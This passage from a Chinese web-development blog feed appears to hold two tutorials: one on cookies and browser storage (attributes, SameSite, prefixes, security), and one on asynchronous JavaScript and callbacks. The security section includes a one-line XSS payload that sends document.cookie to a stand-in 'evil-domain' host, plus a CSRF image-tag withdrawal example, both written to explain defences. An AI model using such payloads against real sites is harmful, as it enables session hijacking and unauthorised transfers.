href="#定义-Cookie-的生命周期" class="headerlink" title="定义 Cookie 的生命周期"></a>定义 Cookie 的生命周期</h3><p>Cookie 的生命周期可以通过两种方式定义：</p><ul><li>会话期 Cookie 是最简单的 Cookie：浏览器关闭之后它会被自动删除，也就是说它仅在会话期内有效。会话期Cookie不需要指定过期时间（<code>Expires</code>）或者有效期（<code>Max-Age</code>）。需要注意的是，有些浏览器提供了<strong>会话恢复</strong>功能，这种情况下即使关闭了浏览器，会话期Cookie 也会被保留下来，就好像浏览器从来没有关闭一样，这会导致 <strong>Cookie 的生命周期无限期延长</strong>。</li><li>持久性 Cookie 的生命周期取决于过期时间（<code>Expires</code>）或有效期（<code>Max-Age</code>）指定的一段时间。</li></ul><p>例如：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Set</span>-Cookie: id=a3fWa; Expires=Wed, <span class="number">21</span> Oct <span class="number">2015</span> <span class="number">07</span>:<span class="number">28</span>:<span class="number">00</span> GMT;</span><br></pre></td></tr></table></figure><p><strong>提示：</strong>当Cookie的过期时间被设定时，<strong>设定的日期和时间只与客户端相关</strong>，而不是服务端。</p><p>如果您的站点对用户进行身份验证，则每当用户进行身份验证时，它都应重新生成并重新发送会话 Cookie，甚至是已经存在的会话 Cookie。此技术有助于防止[会话固定攻击（session fixation attacks）]，在该攻击中第三方可以重用用户的会话。</p><h3 id="限制访问-Cookie"><a href="#限制访问-Cookie" class="headerlink" title="限制访问 Cookie"></a>限制访问 Cookie</h3><p>有两种方法可以确保 <code>Cookie</code> 被安全发送，并且不会被意外的参与者或脚本访问：<code>Secure</code> 属性和<code>HttpOnly</code> 属性。</p><p>标记为 <code>Secure</code> 的 Cookie 只应通过被 <strong>HTTPS</strong> 协议加密过的请求发送给服务端，因此可以预防 <a href="https://developer.mozilla.org/zh-CN/docs/Glossary/MitM">man-in-the-middle</a> 攻击者的攻击。但即便设置了 <code>Secure</code> 标记，敏感信息也不应该通过 Cookie 传输，因为 Cookie 有其固有的不安全性，<code>Secure</code> 标记也无法提供确实的安全保障, 例如，可以访问客户端硬盘的人可以读取它。</p><p>从 Chrome 52 和 Firefox 52 开始，不安全的站点（<code>http:</code>）无法使用Cookie的 <code>Secure</code> 标记。</p><p>JavaScript <code>Document.cookie</code> API 无法访问带有 <code>HttpOnly</code> 属性的cookie；<strong>此类 Cookie 仅作用于服务器</strong>。例如，持久化服务器端会话的 Cookie 不需要对 JavaScript 可用，而应具有 <code>HttpOnly</code> 属性。此预防措施有助于缓解跨站点脚本（XSS） (en-US)攻击。</p><p>示例：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Set</span>-Cookie: id=a3fWa; Expires=Wed, <span class="number">21</span> Oct <span class="number">2015</span> <span class="number">07</span>:<span class="number">28</span>:<span class="number">00</span> GMT; Secure; HttpOnly</span><br></pre></td></tr></table></figure><h3 id="Cookie-的作用域"><a href="#Cookie-的作用域" class="headerlink" title="Cookie 的作用域"></a>Cookie 的作用域</h3><p><code>Domain</code> 和 <code>Path</code> 标识定义了Cookie的作用域：即允许 Cookie 应该发送给哪些URL。</p><h4 id="Domain-属性"><a href="#Domain-属性" class="headerlink" title="Domain 属性"></a>Domain 属性</h4><p><code>Domain</code> 指定了哪些主机可以接受 Cookie。如果不指定，默认为<code>origin</code>，<strong>不包含子域名</strong>。如果指定了<code>Domain</code>，则一般包含子域名。因此，指定 <code>Domain</code> 比省略它的限制要少。但是，当子域需要共享有关用户的信息时，这可能会有所帮助。 </p><p>例如，如果设置 <code>Domain=mozilla.org</code>，则 Cookie 也包含在子域名中（如<code>developer.mozilla.org</code>）。</p><p>当前大多数浏览器遵循 <a href="https://tools.ietf.org/html/rfc6265">RFC 6265</a>，设置 Domain 时 不需要加前导点。浏览器不遵循该规范，则需要加前导点，例如：<code>Domain=.mozilla.org</code></p><h4 id="Path-属性"><a href="#Path-属性" class="headerlink" title="Path 属性"></a>Path 属性</h4><p><code>Path</code> 标识指定了主机下的哪些路径可以接受 Cookie（该 URL 路径必须存在于请求 URL 中）。以字符 <code>%x2F</code> (“/“) 作为路径分隔符，子路径也会被匹配。</p><p>例如，设置 <code>Path=/docs</code>，则以下地址都会匹配：</p><ul><li><code>/docs</code></li><li><code>/docs/Web/</code></li><li><code>/docs/Web/HTTP</code></li></ul><h4 id="SameSite-attribute"><a href="#SameSite-attribute" class="headerlink" title="SameSite attribute"></a>SameSite attribute</h4><p><code>SameSite</code> Cookie 允许服务器要求某个 cookie 在跨站请求时不会被发送，（其中 Site由可注册域定义），从而可以阻止跨站请求伪造攻击（CSRF）。</p><p>SameSite cookies 是相对较新的一个字段，所有主流浏览器都已经得到支持。</p><p>下面是例子：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Set</span>-Cookie: key=value; SameSite=Strict</span><br></pre></td></tr></table></figure><p>SameSite 可以有下面三种值：</p><ul><li><code>None</code><strong>。</strong>浏览器会在同站请求、跨站请求下继续发送 cookies，不区分大小写。</li><li><strong><code>Strict</code>。</strong>浏览器将只在访问相同站点时发送 cookie。（在原有 Cookies 的限制条件上的加强，如上文 “Cookie 的作用域” 所述）</li><li><strong><code>Lax</code>。</strong>与 <strong><code>Strict</code></strong> 类似，但用户从外部站点导航至URL时（例如通过链接）除外。 在新版本浏览器中，为默认选项，Same-site cookies 将会为一些跨站子请求保留，如图片加载或者 frames 的调用，但只有当用户从外部站点导航到URL时才会发送。如 link 链接</li></ul><p>以前，如果 SameSite 属性没有设置，或者没有得到运行浏览器的支持，那么它的行为等同于 None，Cookies 会被包含在任何请求中——包括跨站请求。</p><p>大多数主流浏览器正在将<strong>SameSite 的默认值迁移至 Lax</strong>。如果想要指定 Cookies 在<strong>同站、跨站</strong>请求都被发送，现在需要明确指定 SameSite 为 None。</p><h4 id="Cookie-prefixes"><a href="#Cookie-prefixes" class="headerlink" title="Cookie prefixes"></a>Cookie prefixes</h4><p>cookie 机制的使得服务器无法确认 cookie 是在安全来源上设置的，甚至无法确定 cookie 最初是在哪里设置的。</p><p>子域上的易受攻击的应用程序可以使用 Domain 属性设置 cookie，从而可以访问所有其他子域上的该 cookie。会话固定攻击中可能会滥用此机制。</p><p>但是，作为深度防御措施，可以使用 cookie 前缀来断言有关 cookie 的特定事实。有两个前缀可用：</p><ul><li><p><code>__Host-</code></p><p>如果 cookie 名称具有此前缀，则仅当它也用 <code>Secure</code> 属性标记，是从安全来源发送的，不包括 <code>Domain</code> 属性，并将 <code>Path</code> 属性设置为 <code>/</code> 时，它才在 <code>Set-Cookie</code>标头中接受。这样，这些 cookie 可以被视为 “domain-locked”。</p></li><li><p><code>__Secure-</code></p><p>如果 cookie 名称具有此前缀，则仅当它也用 <code>Secure</code> 属性标记，是从安全来源发送的，它才在 <code>Set-Cookie</code>标头中接受。该前缀限制要弱于 <code>__Host-</code> 前缀。</p></li></ul><p>带有这些前缀点 Cookie， 如果不符合其限制的会被浏览器拒绝。请注意，这确保了如果子域要创建带有前缀的 cookie，那么它将要么局限于该子域，要么被完全忽略。由于应用服务器仅在确定用户是否已通过身份验证或 CSRF 令牌正确时才检查特定的 cookie 名称，因此，这有效地充当了针对会话劫持的防御措施。</p><p>在应用程序服务器上，Web 应用程序<strong>必须</strong>检查完整的 cookie 名称，包括前缀 —— 用户代理程序在从请求的 <a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Cookie"><code>Cookie</code></a> 标头中发送前缀之前，<strong>不会</strong>从 cookie 中剥离前缀。</p><h4 id="JavaScript-通过-Document-cookie-访问-Cookie"><a href="#JavaScript-通过-Document-cookie-访问-Cookie" class="headerlink" title="JavaScript 通过 Document.cookie 访问 Cookie"></a>JavaScript 通过 Document.cookie 访问 Cookie</h4><p>通过 <code>Document.cookie</code> 属性可创建新的 Cookie，也可通过该属性访问非<code>HttpOnly</code>标记的Cookie。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">document</span>.cookie = <span class="string">&quot;yummy_cookie=choco&quot;</span>;</span><br><span class="line"><span class="built_in">document</span>.cookie = <span class="string">&quot;tasty_cookie=strawberry&quot;</span>;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="built_in">document</span>.cookie);</span><br><span class="line"><span class="comment">// logs &quot;yummy_cookie=choco; tasty_cookie=strawberry&quot;</span></span><br></pre></td></tr></table></figure><p>通过 JavaScript 创建的 Cookie 不能包含 HttpOnly 标志。</p><p>JavaScript 可以通过跨站脚本攻击（XSS）的方式来窃取 Cookie。</p><h3 id="安全"><a href="#安全" class="headerlink" title="安全"></a>安全</h3><p>信息被存在 Cookie 中时，需要明白 cookie 的值是可以被访问，且可以被终端用户所修改的。根据应用程序的不同，可能需要使用服务器查找的不透明标识符，或者研究诸如 JSON Web Tokens 之类的替代身份验证/机密机制。</p><p><strong>当机器处于不安全环境时，切记不能通过 HTTP Cookie 存储、传输敏感信息。</strong></p><p>缓解涉及Cookie的攻击的方法：</p><ul><li>使用 <code>HttpOnly</code> 属性可<strong>防止通过 JavaScript 访问 cookie 值</strong>。</li><li><strong>用于敏感信息（例如指示身份验证）的 Cookie 的生存期应较短</strong>，并且 <code>SameSite</code> 属性设置为<code>Strict</code> 或 <code>Lax</code>。在支持 SameSite 的浏览器中，这样做的作用是确保不与跨域请求一起发送身份验证 cookie，因此，这种请求实际上不会向应用服务器进行身份验证。</li></ul><h3 id="会话劫持和-XSS"><a href="#会话劫持和-XSS" class="headerlink" title="会话劫持和 XSS"></a>会话劫持和 XSS</h3><p>在 Web 应用中，Cookie 常用来标记用户或授权会话。因此，如果 Web 应用的 Cookie 被窃取，可能导致授权用户的会话受到攻击。常用的窃取 Cookie 的方法有利用社会工程学攻击和利用应用程序漏洞进行 XSS 攻击。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(<span class="keyword">new</span> Image()).src = <span class="string">&quot;http://www.evil-domain.com/steal-cookie.php?cookie=&quot;</span> + <span class="built_in">document</span>.cookie;</span><br></pre></td></tr></table></figure><p><code>HttpOnly</code> 类型的 Cookie 用于阻止了JavaScript 对其的访问性而能在一定程度上缓解此类攻击。</p><h3 id="跨站请求伪造（CSRF）"><a href="#跨站请求伪造（CSRF）" class="headerlink" title="跨站请求伪造（CSRF）"></a>跨站请求伪造（CSRF）</h3><p>维基百科已经给了一个比较好的 CSRF例子。比如在不安全聊天室或论坛上的一张图片，它实际上是一个给你银行服务器发送提现的请求：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;http://bank.example.com/withdraw?account=bob&amp;amount=1000000&amp;for=mallory&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure><p>当你打开含有了这张图片的 HTML 页面时，如果你之前已经登录了你的银行帐号并且 Cookie 仍然有效（还没有其它验证步骤），你银行里的钱很可能会被自动转走。有一些方法可以阻止此类事件的发生：</p><ul><li>对用户输入进行过滤来阻止XSS；</li><li>任何敏感操作都需要确认；</li><li>用于敏感信息的 Cookie 只能拥有较短的生命周期；</li></ul><h3 id="Cookie大小及浏览器限制"><a href="#Cookie大小及浏览器限制" class="headerlink" title="Cookie大小及浏览器限制"></a>Cookie大小及浏览器限制</h3><ul><li><code>Cookie</code><strong>数量和长度</strong>的限制。<code>IE6</code>或更低版本每个<code>domian</code>下最多<code>20</code>个<code>cookie</code>，<code>IE7</code>和之后的版本最多可以有 <code>50</code>个<code>cookie</code>，<code>Firefox</code>最多<code>50</code>个<code>cookie</code>，<code>chrome</code>和<code>Safari</code>没有做硬性限制，每个<code>cookie</code>长度不能超过<code>4KB</code>，否则会被截掉。</li><li><code>IE</code>和<code>Opera</code> 会<strong>清理</strong>近期最少使用的<code>cookie</code>，<code>Firefox</code>会随机清理<code>cookie</code>。这就导致不能永久储存信息。</li></ul><h2 id="本地储存"><a href="#本地储存" class="headerlink" title="本地储存"></a>本地储存</h2><blockquote><p>Cookie的作用是与服务器进行交互，作为HTTP规范的一部分而存在，而Web Storage仅仅是为了在本地“存储”数据而生。</p><p>即<code>sessionStorage</code>和<code>localStorage</code>不会自动把数据发给服务器，仅在本地保存。</p></blockquote><h3 id="localStorage-amp-amp-sessionStorage"><a href="#localStorage-amp-amp-sessionStorage" class="headerlink" title="localStorage &amp;&amp; sessionStorage"></a>localStorage &amp;&amp; sessionStorage</h3><blockquote><p>只要有效期和作用域，浏览器每次访问的时候都会将<code>Storage</code>载入到内存里</p></blockquote><ul><li><code>localStorage</code>用于持久化的本地存储，除非主动删除数据，否则数据是永远不会过期的。</li><li><code>sessionStorage</code>用于本地存储一个会话（<code>session</code>）中的数据，这些数据只有在同一个会话中的页面才能访问并且当会话结束后数据也随之销毁。因此<code>sessionStorage</code>不是一种持久化的本地存储，仅仅是会话级别的存储。也就是说<strong>只要这个浏览器窗口没有关闭</strong>，即使刷新页面或进入同源另一页面，数据仍然存在。关闭窗口后，<code>sessionStorage</code>即被销毁。</li><li><code>localStorage</code>也受同源策略的限制。</li><li><code>localStorage</code>和<code>sessionStorage</code>都具有相同的操作方法，如<code>setItem</code>,<code>getItem</code>,<code>removeItem</code>,<code>clear</code>等方法，不像<code>cookie</code>需要前端开发者自己封装<code>setCookie</code>，<code>getCookie</code>。</li></ul><h3 id="IndexedDB"><a href="#IndexedDB" class="headerlink" title="IndexedDB"></a>IndexedDB</h3><p>IndexedDB 是一种底层 API，用于在客户端存储大量的结构化数据（也包括文件/二进制大型对象（blobs））。该 API 使用索引实现对数据的高性能搜索。虽然 Web Storage 在存储较少量的数据很有用，但对于存储更大量的结构化数据来说力不从心。而 IndexedDB 提供了这种场景的解决方案。</p><p>IndexedDB 是一个事务型数据库系统，类似于基于 SQL 的 RDBMS。 然而，不像 RDBMS 使用固定列表，IndexedDB 是一个基于 JavaScript 的面向对象数据库。IndexedDB 允许您存储和检索用<strong>键</strong>索引的对象；可以存储结构化克隆算法支持的任何对象。您只需要指定数据库模式，打开与数据库的连接，然后检索和更新一系列<strong>事务</strong>。</p><p>使用 IndexedDB 执行的操作是异步执行的，以免阻塞应用程序。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><table><thead><tr><th align="center">特性</th><th align="center">cookie</th><th align="center">localStorage</th><th align="center">sessionStorage</th><th align="center">indexDB</th></tr></thead><tbody><tr><td align="center">数据生命周期</td><td align="center">一般由服务器生成，会话期 Cookie/持久性 Cookie可以设置过期时间</td><td align="center">除非被清理，否则一直存在</td><td align="center">页面关闭就清理</td><td align="center">除非被清理，否则一直存在</td></tr><tr><td align="center">数据存储大小</td><td align="center">4K(数量20+，取决于浏览器)</td><td align="center">5M</td><td align="center">5M</td><td align="center">无限</td></tr><tr><td align="center">与服务端通信</td><td align="center">每次都会携带在header中，对于请求性能影响</td><td align="center">不参与</td><td align="center">不参与</td><td align="center">不参与</td></tr></tbody></table><p>Cookie 主要用于以下三个方面：</p><ul><li><strong>会话状态管理</strong>（如用户登录状态、购物车、游戏分数或其它需要记录的信息）</li><li><strong>个性化设置</strong>（如用户自定义设置、主题等）</li><li><strong>浏览器行为跟踪</strong>（如跟踪分析用户行为等）</li></ul><p>Cookie <strong>曾一度用于客户端数据的存储</strong>，因当时并没有其它合适的存储办法而作为唯一的存储手段，但现在随着现代浏览器开始支持各种各样的存储方式，Cookie 渐渐被淘汰。由于服务器指定 Cookie 后，浏览器的每次请求都会携带 Cookie 数据，<strong>会带来额外的性能开销（尤其是在移动环境下）</strong>。新的浏览器API已经允许开发者直接将数据存储到本地，如使用 <code>Web storage API</code>（本地存储和会话存储）或 <code>IndexedDB</code> 。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Cookie、sessionStorage、localStorage-详解及应用场景&quot;&gt;&lt;a href=&quot;#Cookie、sessionStorage、localStorage-详解及应用场景&quot; class=&quot;headerlink&quot; title=&quot;Cookie、s</summary>
      
    
    
    
    <category term="计算机网络和浏览器" scheme="https://lesliewaong.top/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%92%8C%E6%B5%8F%E8%A7%88%E5%99%A8/"/>
    
    
    <category term="Cookie" scheme="https://lesliewaong.top/tags/Cookie/"/>
    
    <category term="sessionStorage" scheme="https://lesliewaong.top/tags/sessionStorage/"/>
    
    <category term="localStorage" scheme="https://lesliewaong.top/tags/localStorage/"/>
    
  </entry>
  
  <entry>
    <title>异步编程和事件循环</title>
    <link href="https://lesliewaong.top/posts/ebeefcc9.html"/>
    <id>https://lesliewaong.top/posts/ebeefcc9.html</id>
    <published>2022-02-27T05:12:12.000Z</published>
    <updated>2022-03-25T14:08:26.424Z</updated>
    
    <content type="html"><![CDATA[<h1 id="异步"><a href="#异步" class="headerlink" title="异步"></a>异步</h1><p>通常来说，程序都是顺序执行，同一时刻只会发生一件事。如果一个函数依赖于另一个函数的结果，它只能等待那个函数结束才能继续执行，从用户的角度来说，整个程序才算运行完毕.</p><p>这是令人沮丧的体验，没有充分利用计算机的计算能力 — 尤其是在计算机普遍都有多核CPU的时代，坐在那里等待毫无意义，你完全可以在另一个处理器内核上干其他的工作，同时计算机完成耗时任务的时候通知你。这样你可以同时完成其他工作，这就是<strong>异步编程</strong>的出发点。你正在使用的编程环境（就web开发而言，编程环境就是web浏览器）负责为你提供异步运行此类任务的API。</p><h2 id="产生阻塞的代码"><a href="#产生阻塞的代码" class="headerlink" title="产生阻塞的代码"></a>产生阻塞的代码</h2><p>异步技术非常有用，特别是在web编程。当浏览器里面的一个web应用进行密集运算还没有把控制权返回给浏览器的时候，整个浏览器就像冻僵了一样，这叫做<strong>阻塞；</strong>这时候浏览器无法继续处理用户的输入并执行其他任务，直到web应用交回处理器的控制。</p><p>为什么是这样? 答案是：JavaScript一般来说是单线程的（<strong>single threaded</strong>）<strong>。</strong>接着我们来介绍<strong>线程</strong>的概念。</p><h2 id="线程"><a href="#线程" class="headerlink" title="线程"></a>线程</h2><p>一个<strong>线程</strong>是一个基本的处理过程，程序用它来完成任务。每个线程一次只能执行一个任务:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Task A --&gt; Task B --&gt; Task C</span><br></pre></td></tr></table></figure><p>每个任务顺序执行，只有前面的结束了，后面的才能开始。</p><p>正如我们之前所说，现在的计算机大都有多个内核（core），因此可以同时执行多个任务。支持多线程的编程语言可以使用计算机的多个内核，同时完成多个任务:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Thread <span class="number">1</span>: Task A --&gt; Task B</span><br><span class="line">Thread <span class="number">2</span>: Task C --&gt; Task D</span><br></pre></td></tr></table></figure><h3 id="JavaScript-是单线程的"><a href="#JavaScript-是单线程的" class="headerlink" title="JavaScript 是单线程的"></a>JavaScript 是单线程的</h3><p>JavaScript 传统上是单线程的。即使有多个内核，也只能在单一线程上运行多个任务，此线程称为主线程（<strong>main thread</strong>）。</p><p>经过一段时间，JavaScript获得了一些工具来帮助解决这种问题。通过 <code>Web workers</code>可以把一些任务交给一个名为<code>worker</code>的单独的线程，这样就可以同时运行多个JavaScript代码块。一般来说，用一个worker来运行一个耗时的任务，主线程就可以处理用户的交互（避免了阻塞）。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Main thread: Task A --&gt; Task C</span><br><span class="line">Worker thread: Expensive task B</span><br></pre></td></tr></table></figure><h2 id="异步代码"><a href="#异步代码" class="headerlink" title="异步代码"></a>异步代码</h2><p>web workers相当有用，但是他们确实也有局限。主要的一个问题是他们<strong>不能访问 DOM— 不能让一个worker直接更新UI</strong>。</p><p>我们不能在worker里面渲染1百万个蓝色圆圈，它基本上只能做算数的苦活。</p><p>其次，虽然在worker里面运行的代码不会产生阻塞，但是<strong>基本上还是同步的</strong>。</p><p>当一个函数依赖于几个在它之前运行的过程的结果，这就会成为问题。考虑下面的情况:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Main thread: Task A --&gt; Task B</span><br></pre></td></tr></table></figure><p>在这种情况下，比如说Task A 正在从服务器上获取一个图片之类的资源，Task B 准备在图片上加一个滤镜。</p><p>如果开始运行Task A 后立即尝试运行Task B，你将会得到一个错误，因为图像还没有获取到。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Main thread: Task A --&gt; Task B --&gt; |Task D|</span><br><span class="line">Worker thread: Task C -----------&gt; |      |</span><br></pre></td></tr></table></figure><p>在这种情况下，假设Task D 要同时使用 Task B 和Task C的结果，如果我们能保证这两个结果同时提供，程序可能正常运行，但是这不太可能。如果Task D 尝试在其中一个结果尚未可用的情况下就运行，程序就会抛出一个错误。</p><p>为了解决这些问题，浏览器允许我们异步运行某些操作。</p><p>像<code>Promises</code>这样的功能就允许让一些操作运行 (比如：从服务器上获取图片)，然后等待直到结果返回，再运行其他的操作:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Main thread: Task A                   Task B</span><br><span class="line">    <span class="attr">Promise</span>:      |__async operation__|</span><br></pre></td></tr></table></figure><p><strong>由于操作发生在其他地方，因此在处理异步操作的时候，主线程不会被阻塞。</strong></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>围绕异步编程领域，现代软件设计正在加速旋转，就为了让程序在一个时间内做更多的事情。当你使用更新更强大的API时，你会发现在更多的情况下，使用异步编程是唯一的途径。以前写异步代码很困难，现在也需要你来适应，但是已经变容易了很多。在余下的部分，我们将进一步探讨异步代码的重要性，以及如何设计代码来防止前面已经提到过的问题。</p><h2 id="同步JavaScript"><a href="#同步JavaScript" class="headerlink" title="同步JavaScript"></a>同步JavaScript</h2><p>要理解什么是<strong>异步</strong> JavaScript ，我们应该从确切理解<strong>同步</strong> JavaScript 开始。</p><p>前面学的很多知识基本上都是同步的 — 运行代码，然后浏览器尽快返回结果。先看一个简单的例子 ：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> btn = <span class="built_in">document</span>.querySelector(<span class="string">&#x27;button&#x27;</span>);</span><br><span class="line">btn.addEventListener(<span class="string">&#x27;click&#x27;</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">  alert(<span class="string">&#x27;You clicked me!&#x27;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">let</span> pElem = <span class="built_in">document</span>.createElement(<span class="string">&#x27;p&#x27;</span>);</span><br><span class="line">  pElem.textContent = <span class="string">&#x27;This is a newly-added paragraph.&#x27;</span>;</span><br><span class="line">  <span class="built_in">document</span>.body.appendChild(pElem);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>这段代码, 一行一行的顺序执行：</p><ol><li>先取得一个在DOM里面的 <code>&lt;button&gt;</code>引用。</li><li>点击按钮的时候，添加一个<code>click</code>事件监听器:<ol><li><code>alert()</code> 消息出现。</li><li>一旦alert 结束，创建一个<code>&lt;p&gt;</code>元素。</li><li>给它的文本内容赋值。</li><li>最后，把这个段落放进网页。</li></ol></li></ol><p>每一个操作在执行的时候，其他任何事情都没有发生 — 网页的渲染暂停。</p><p>任何时候只能做一件事情, 只有一个主线程，其他的事情都阻塞了，直到前面的操作完成。</p><p>所以上面的例子，点击了按钮以后，段落不会创建，直到在alert消息框中点击ok，段落才会出现。</p><p><strong>Note</strong>: 这很重要请记住，<code>alert()</code>在演示阻塞效果的时候非常有用，但是在正式代码里面，它就是一个噩梦。</p><h2 id="异步JavaScript"><a href="#异步JavaScript" class="headerlink" title="异步JavaScript"></a>异步JavaScript</h2><p>就前面提到的种种原因（比如，和阻塞相关）很多网页API特性使用异步代码，特别是从外部的设备上获取资源，譬如，从网络获取文件，访问数据库，从网络摄像头获得视频流，或者向VR头罩广播图像。</p><p>为什么使用异步代码这么难？看一个例子，当你从服务器获取一个图像，通常你不可能立马就得到，这需要时间，虽然现在的网络很快。这意味着下面的伪代码可能不能正常工作：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> response = fetch(<span class="string">&#x27;myImage.png&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> blob = response.blob();</span><br><span class="line"><span class="comment">// display your image blob in the UI somehow</span></span><br></pre></td></tr></table></figure><p>因为你不知道下载图片会多久，所以第二行代码执行的时候可能报错（可能间歇的，也可能每次）因为图像还没有就绪。取代的方法就是，代码必须等到 <code>response</code> 返回才能继续往下执行。</p><p>在JavaScript代码中，你经常会遇到两种异步编程风格：老派callbacks，新派promise。下面就来分别介绍。</p><h2 id="异步callbacks"><a href="#异步callbacks" class="headerlink" title="异步callbacks"></a>异步callbacks</h2><p>异步callbacks 其实就是<strong>函数</strong>，只不过是作为<strong>参数</strong>传递给那些在后台执行的其他函数。 当那些后台运行的代码结束，就调用callbacks函数，通知你工作已经完成，或者其他有趣的事情发生了。使用callbacks 有一点老套，在一些老派但经常使用的API里面，你会经常看到这种风格。</p><p>举个例子，异步callback 就是<code>addEventListener()</code>第二个参数（前面的例子）：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">btn.addEventListener(<span class="string">&#x27;click&#x27;</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">  alert(<span class="string">&#x27;You clicked me!&#x27;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">let</span> pElem = <span class="built_in">document</span>.createElement(<span class="string">&#x27;p&#x27;</span>);</span><br><span class="line">  pElem.textContent = <span class="string">&#x27;This is a newly-added paragraph.&#x27;</span>;</span><br><span class="line">  <span class="built_in">document</span>.body.appendChild(pElem);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>第一个参数是侦听的事件类型，第二个就是事件发生时调用的回调函数。.</p><p>当我们把<strong>回调函数作为一个参数传递给另一个函数时，仅仅是把回调函数定义作为参数传递过去</strong> — <strong>回调函数并没有立刻执行，回调函数会在包含它的函数的某个地方异步执行，包含函数负责在合适的时候执行回调函数</strong>。</p><p>你可以自己写一个容易的，包含回调函数的函数。来看另外一个例子：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">loadAsset</span>(<span class="params">url, type, callback</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">let</span> xhr = <span class="keyword">new</span> XMLHttpRequest();</span><br><span class="line">  xhr.open(<span class="string">&#x27;GET&#x27;</span>, url);</span><br><span class="line">  xhr.responseType = type;</span><br><span class="line"></span><br><span class="line">  xhr.onload = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    callback(xhr.response);</span><br><span class="line">  &#125;;</span><br><span class="line"></span><br><span class="line">  xhr.send();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">displayImage</span>(<span class="params">blob</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">let</span> objectURL = URL.createObjectURL(blob);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">let</span> image = <span class="built_in">document</span>.createElement(<span class="string">&#x27;img&#x27;</span>);</span><br><span class="line">  image.src = objectURL;</span><br><span class="line">  <span class="built_in">document</span>.body.appendChild(image);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">loadAsset(<span class="string">&#x27;coffee.jpg&#x27;</span>, <span class="string">&#x27;blob&#x27;</span>, displayImage);</span><br></pre></td></tr></table></figure><p>创建 <code>displayImage()</code> 函数，简单的把blob传递给它，生成objectURL，然后再生成一个image元素，把objectURL作为image的源地址，最后显示这张图片。 然后，我们创建 <code>loadAsset()</code> 函数，把URL，type，和回调函数同时都作为参数。函数用 <code>XMLHttpRequest</code> (通常缩写 “XHR”) 获取给定URL的资源，在获得资源响应后再把响应作为参数传递给回调函数去处理。 (使用 <code>onload</code> 事件处理) ，有点烧脑，是不是？！</p><p>回调函数用途广泛 — 他们不仅仅可以用来控制函数的执行顺序和函数之间的数据传递，还可以根据环境的不同，将数据传递给不同的函数，所以对下载好的资源，你可以采用不同的操作来处理，譬如 <code>processJSON()</code>, <code>displayText()</code>, 